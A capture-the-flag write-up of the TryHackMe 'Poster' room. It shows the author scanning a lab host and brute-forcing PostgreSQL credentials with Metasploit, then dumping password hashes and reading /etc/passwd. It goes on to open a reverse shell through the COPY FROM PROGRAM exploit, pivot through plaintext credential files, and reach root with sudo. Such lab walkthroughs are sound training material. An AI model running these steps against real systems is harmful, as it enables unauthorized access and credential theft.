# THM: Poster

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/poster/poster.png" alt="Poster" width="90"/> |
| Room | Poster |
| URL | https://tryhackme.com/room/poster |
| Difficulty | Easy |

## Concepts/Tools Used

- [msfconsole](/tools/msfconsole.md)
- [find](/tools/find.md)

## Room Description

The sys admin set up a rdbms in a safe way.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-14 14:19 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating ARP Ping Scan at 14:19
Scanning target.thm (10.10.26.235) [1 port]
Completed ARP Ping Scan at 14:19, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:19
Scanning target.thm (10.10.26.235) [65535 ports]
Discovered open port 22/tcp on 10.10.26.235
Discovered open port 80/tcp on 10.10.26.235
Discovered open port 5432/tcp on 10.10.26.235
Completed SYN Stealth Scan at 14:19, 3.06s elapsed (65535 total ports)
Initiating Service scan at 14:19
Scanning 3 services on target.thm (10.10.26.235)
Completed Service scan at 14:19, 6.01s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.26.235.
Initiating NSE at 14:19
Completed NSE at 14:19, 1.01s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.23s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Nmap scan report for target.thm (10.10.26.235)
Host is up (0.00074s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da57 3213 e9aa 9274 d0be c1b0 bbb2 0b09
|_SHA-1: 4e03 8469 28f7 673b 2bb2 0440 4ba9 e4d2 a0d0 5dd5
|_ssl-date: TLS randomness does not represent time
MAC Address: 02:2C:ED:44:21:D1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Initiating NSE at 14:19
Completed NSE at 14:19, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

## What is the rdbms installed on the server?

The above nmap output says PostgreSQL

## What port is the rdbms running on?

The above nmap output says 5432

## After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

I started up msfconsole and searched postgresql. I was looking for a module descriptions that mentioned logins. I found one that was a login utility.

```bash
msf6 > search postgresql

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   auxiliary/server/capture/postgresql                                                       .                normal     No     Authentication Capture: PostgreSQL
   4   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   5   post/linux/gather/enum_users_history                                                      .                normal     No     Linux Gather User History
   6   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   7     \_ target: Automatic                                                                    .                .          .      .
   8     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   9     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   10    \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   11    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   12    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   13    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   14    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   15  auxiliary/admin/http/manageengine_pmp_privesc                                             2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   16  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   17    \_ target: Automatic                                                                    .                .          .      .
   18    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   19    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   20    \_ target: Windows (CMD)                                                                .                .          .      .
   21  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   22  auxiliary/scanner/postgres/postgres_dbname_flag_injection                                 .                normal     No     PostgreSQL Database Name Command Line Flag Injection
   23  auxiliary/scanner/postgres/postgres_login                                                 .                normal     No     PostgreSQL Login Utility
   24  auxiliary/admin/postgres/postgres_readfile                                                .                normal     No     PostgreSQL Server Generic Query
   25  auxiliary/admin/postgres/postgres_sql                                                     .                normal     No     PostgreSQL Server Generic Query
   26  auxiliary/scanner/postgres/postgres_version                                               .                normal     No     PostgreSQL Version Probe
   27  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   28    \_ target: Linux x86                                                                    .                .          .      .
   29    \_ target: Linux x86_64                                                                 .                .          .      .
   30  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   31    \_ target: Windows x86                                                                  .                .          .      .
   32    \_ target: Windows x64                                                                  .                .          .      .
   33  auxiliary/admin/http/rails_devise_pass_reset                                              2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   34  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution
   35  post/linux/gather/vcenter_secrets_dump                                                    2022-04-15       normal     No     VMware vCenter Secrets Dump


Interact with a module by name or index. For example info 35, use 35 or use post/linux/gather/vcenter_secrets_dump

msf6 > use 23
```

## What are the credentials you found?

I set the rhosts option to use the target machine and then I run the scanner.

```bash
msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts target.thm
rhosts => target.thm
msf6 auxiliary(scanner/postgres/postgres_login) > run
[-] 10.10.26.235:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.26.235:5432 - Login Successful: REDACTED:REDACTED@template1
[-] 10.10.26.235:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.26.235:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

## What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

auxiliary/admin/postgres/postgres_sql

## Based on the results of #6, what is the rdbms version installed on the server?

I set the password option and ran the module from the previous question.

```bash
msf6 auxiliary(admin/postgres/postgres_sql) > set password REDACTED
password => REDACTED
msf6 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.26.235
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

## What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

I used the same search as before and found a module named auxiliary/scanner/postgres/postgres_hashdump. I set the password to the value from the earlier question and ran the module.

```bash
msf6 > search postgres
```

## How many user hashes does the module dump?

I ran the module and you can see the output of the hashes that were dumped below.

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > set password REDACTED
password => REDACTED
msf6 auxiliary(scanner/postgres/postgres_hashdump) > run
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

I ran the same search again and found the auxiliary/admin/postgres/postgres_readfile module.

```bash
msf6 > search postgres
```

I set the password option and ran the module.

```bash
msf6 auxiliary(admin/postgres/postgres_readfile) > set password REDACTED
password => REDACTED
msf6 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.26.235
Query Text: 'CREATE TEMP TABLE RihqUBYOopVZmq (INPUT TEXT);
      COPY RihqUBYOopVZmq FROM '/etc/passwd';
      SELECT * FROM RihqUBYOopVZmq'
=============================================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.26.235:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20250714144554_default_10.10.26.235_postgres.file_579967.txt
[*] Auxiliary module execution completed
```

## What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

As always, same search and I found the exploit/multi/postgres/postgres_copy_from_program_cmd_exec module.

```bash
msf6 > search postgres
```

Now it is time to get a shell on the machine. I set the password option to the password that was given earlier. I set the lhost option to my attack machine ip address. Then I ran the module.

```bash
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password REDACTED
password => REDACTED
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost <attack_machine_ip>
lhost => <attack_machine_ip>
msf6 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
[*] Started reverse TCP handler on <attack_machine_ip>:4444
[*] 10.10.26.235:5432 - 10.10.26.235:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.26.235:5432 - Exploiting...
[+] 10.10.26.235:5432 - 10.10.26.235:5432 - B7b044aaF dropped successfully
[+] 10.10.26.235:5432 - 10.10.26.235:5432 - B7b044aaF created successfully
[+] 10.10.26.235:5432 - 10.10.26.235:5432 - B7b044aaF copied successfully(valid syntax/command)
[+] 10.10.26.235:5432 - 10.10.26.235:5432 - B7b044aaF dropped successfully(Cleaned)
[*] 10.10.26.235:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.10.98.47:4444 -> 10.10.26.235:34596) at 2025-07-14 15:24:53 +0100
```

## Compromise the machine and locate user.txt

I now have remote code execution! I was the postgres user and I needed to get a privilege escalation to another user so I could get an actual shell. Here are the commands I ran to find credentials for another user:

```bash
$ whoami
postgres
$ ls /home
alison  dark
$ ls /home/alison
user.txt
$ cat /home/alison/user.txt
$ ls /home/dark
credentials.txt
$ cat /home/dark/credentials.txt
dark:REDACTED
```

Now that I have credentials for the user dark, I can ssh into the machine:

```bash
$ ssh dark@target.thm
```

I tried to read the file at `/home/alison/user.txt` but I didn't have permissions. I ran a search to see if I could find any files that belonged to the alison user:

```bash
$ find / -type f -user alison 2>/dev/null
...
/var/www/html/config.php
...
```

I ran cat on that file and found credentials for the user alison:

```bash
$ cat /var/www/html/config.php
<?php

$dbhost = "127.0.0.1";
$dbuname = "alison";
$dbpass = REDACTED;
$dbname = "mysudopassword";
?>
```

I used ssh to log in as the alison user:

```bash
$ ssh alison@target.thm
```

Now I can read the file in /home/alison:

```bash
$ cat user.txt
REDACTED
```

## Escalate privileges and obtain root.txt

I ran my usual privilege escalation commands and saw that alison is part of the sudo group when I ran id:

```bash
$ id
uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

Since alison is part of the sudo group and I have their password, I can get root.

```bash
$ sudo su
```

```bash
# whoami
root
```

I run the following commands to get the flag:

```bash
# cd /root
# ls
root.txt
# cat root.txt
REDACTED
```
